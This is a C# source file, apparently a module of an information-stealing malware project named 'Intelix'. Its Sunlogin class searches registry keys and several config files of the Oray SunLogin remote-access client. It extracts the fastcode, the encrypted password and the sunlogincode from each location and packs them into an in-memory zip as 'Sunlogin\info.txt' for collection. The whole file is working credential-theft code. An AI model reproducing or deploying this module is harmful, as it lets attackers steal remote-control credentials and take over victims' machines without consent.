using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using Intelix.Helper.Data;
using Microsoft.Win32;

namespace Intelix.Targets.Applications;

public class Sunlogin : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string name = "SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\Oray SunLogin RemoteClient";
		string name2 = ".DEFAULT\\\\Software\\\\Oray\\\\SunLogin\\\\SunloginClient\\\\SunloginGreenInfo";
		string name3 = ".DEFAULT\\\\Software\\\\Oray\\\\SunLogin\\\\SunloginClient\\\\SunloginInfo";
		StringBuilder sb = new StringBuilder();
		Counter.CounterApplications counterApplications = new Counter.CounterApplications();
		counterApplications.Name = "Sunlogin";
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
		RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(name2);
		RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey(name3);
		if (registryKey != null)
		{
			string path = Path.Combine(Registry.LocalMachine.OpenSubKey(name).GetValue("InstallLocation").ToString(), "config.ini");
			string text = (File.Exists(path) ? File.ReadAllText(path) : string.Empty);
			string fastcode = string.Empty;
			string encry_pwd = string.Empty;
			string sunlogincode = string.Empty;
			if (!string.IsNullOrEmpty(text))
			{
				fastcode = Regex.Match(text, "fastcode=(.*)", RegexOptions.Multiline).Groups[1].Value;
				encry_pwd = Regex.Match(text, "encry_pwd=(.*)", RegexOptions.Multiline).Groups[1].Value;
				sunlogincode = Regex.Match(text, "sunlogincode=(.*)", RegexOptions.Multiline).Groups[1].Value;
			}
			AppendFound("registry_install", path, fastcode, encry_pwd, sunlogincode);
		}
		else if (registryKey2 != null)
		{
			string fastcode2 = Registry.LocalMachine.OpenSubKey(name2).GetValue("base_fastcode").ToString();
			string encry_pwd2 = Registry.LocalMachine.OpenSubKey(name2).GetValue("base_encry_pwd").ToString();
			string sunlogincode2 = Registry.LocalMachine.OpenSubKey(name2).GetValue("base_sunlogincode").ToString();
			AppendFound("registry_greeninfo", string.Empty, fastcode2, encry_pwd2, sunlogincode2);
		}
		else if (registryKey3 != null)
		{
			string fastcode3 = Registry.LocalMachine.OpenSubKey(name3).GetValue("base_fastcode").ToString();
			string encry_pwd3 = Registry.LocalMachine.OpenSubKey(name3).GetValue("base_encry_pwd").ToString();
			string sunlogincode3 = Registry.LocalMachine.OpenSubKey(name3).GetValue("base_sunlogincode").ToString();
			AppendFound("registry_info", string.Empty, fastcode3, encry_pwd3, sunlogincode3);
		}
		string path2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Oray", "SunloginClient", "config.ini");
		if (File.Exists(path2))
		{
			string input = File.ReadAllText(path2);
			string value = Regex.Match(input, "fastcode=(.*)", RegexOptions.Multiline).Groups[1].Value;
			string value2 = Regex.Match(input, "encry_pwd=(.*)", RegexOptions.Multiline).Groups[1].Value;
			string value3 = Regex.Match(input, "sunlogincode=(.*)", RegexOptions.Multiline).Groups[1].Value;
			AppendFound("programdata", path2, value, value2, value3);
		}
		string path3 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Oray", "SunloginClientLite", "sys_lite_config.ini");
		if (File.Exists(path3))
		{
			string input2 = File.ReadAllText(path3);
			string value4 = Regex.Match(input2, "fastcode=(.*)", RegexOptions.Multiline).Groups[1].Value;
			string value5 = Regex.Match(input2, "encry_pwd=(.*)", RegexOptions.Multiline).Groups[1].Value;
			string value6 = Regex.Match(input2, "sunlogincode=(.*)", RegexOptions.Multiline).Groups[1].Value;
			AppendFound("user_roaming", path3, value4, value5, value6);
		}
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3) + "\\Windows\\system32\\config\\systemprofile\\AppData\\Roaming\\Oray\\SunloginClient\\sys_config.ini");
		string path4 = "C:\\\\Windows\\\\system32\\\\config\\\\systemprofile\\\\AppData\\\\Roaming\\\\Oray\\\\SunloginClient\\\\sys_config.ini";
		if (File.Exists(path4))
		{
			string input3 = File.ReadAllText(path4);
			string value7 = Regex.Match(input3, "fastcode=(.*)", RegexOptions.Multiline).Groups[1].Value;
			string value8 = Regex.Match(input3, "encry_pwd=(.*)", RegexOptions.Multiline).Groups[1].Value;
			string value9 = Regex.Match(input3, "sunlogincode=(.*)", RegexOptions.Multiline).Groups[1].Value;
			AppendFound("systemprofile", path4, value7, value8, value9);
		}
		if (sb.Length > 0)
		{
			string text2 = "Sunlogin\\info.txt";
			zip.AddTextFile(text2, sb.ToString());
			counterApplications.Files.Add(text2);
			counter.Applications.Add(counterApplications);
		}
		void AppendFound(string source, string text3, string text4, string text5, string text6)
		{
			sb.AppendLine("Source: " + source);
			if (!string.IsNullOrEmpty(text3))
			{
				sb.AppendLine("Path: " + text3);
				counterApplications.Files.Add(text3 + " => Sunlogin\\info.txt");
			}
			sb.AppendLine("Fastcode: " + text4);
			sb.AppendLine("Encry_pwd: " + text5);
			sb.AppendLine("Sunlogincode: " + text6);
			sb.AppendLine();
		}
	}
}
